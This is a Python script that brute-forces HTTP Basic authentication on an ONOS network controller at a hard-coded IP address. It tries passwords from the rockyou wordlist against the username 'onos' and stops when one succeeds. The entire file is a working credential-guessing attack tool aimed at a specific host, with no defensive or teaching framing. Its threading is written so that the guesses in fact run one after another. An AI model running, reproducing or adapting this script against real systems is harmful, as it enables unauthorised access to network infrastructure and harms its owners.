import base64
import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://34.139.11.27:8181/onos/v1/docs/index.html"
username = "onos"
wordlist_path = 'wordlists/rockyou.txt'
num_threads = 100

def encode_credentials(username:str, password:str):
    credentials =  f"{username}:{password}"

    return base64.b64encode(credentials.encode('ISO-8859-1')).decode("ISO-8859-1")

def try_password(password: str):
    password = password.strip()
    encoded_credentials = encode_credentials(username, password)
    headers = {
        "Authorization": f'Basic {encoded_credentials}',
        "User-Agent": "Mozilla/5.0",
    }

    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"[SUCCESS] Password Found: {password}")
            return True  
        else:
            print(f"[FAILED] Unsuccessful attempt with password: '{password}'")
    except Exception as e:
        
        print(f"[ERROR] Exception occurred for password '{password}': {e}")
    return False


def main():
    with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
        for password in wordlist:
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                future_to_password = {executor.submit(try_password, password)}

                for future in future_to_password:
                    if future.result():  #if password is true stops the threads
                        print('[INFO] Stopping threads')
                        executor.shutdown(wait=False)
                        break




if __name__ == "__main__":
    main()
